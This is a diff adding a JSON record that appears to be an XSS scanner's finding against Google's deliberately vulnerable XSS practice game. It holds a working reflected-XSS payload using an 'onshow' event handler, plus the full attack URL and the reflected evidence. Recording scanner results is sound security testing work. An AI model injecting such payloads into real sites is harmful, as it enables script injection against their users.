@@ -1,0 +1,12 @@
+{
+    "type": "V",
+    "inject_type": "inHTML-none(1)-URL",
+    "poc_type": "plain",
+    "method": "GET",
+    "data": "https://xss-game.appspot.com/level1/frame?query=%3Cdiv+contextmenu%3Dxss%3E%3Cp%3E1%3Cmenu+type%3Dcontext+class%3Ddalfox+id%3Dxss+onshow%3Dprint%281%29%3E%3C%2Fmenu%3E%3C%2Fdiv%3E",
+    "param": "query",
+    "payload": "<div contextmenu=xss><p>1<menu type=context class=dalfox id=xss onshow=print(1)></menu></div>",
+    "evidence": "13 line:  s were found for <b><div contextmenu=xss><p>1<menu type=context class=dalfox id=",
+    "cwe": "CWE-79",
+    "severity": "High"
+}
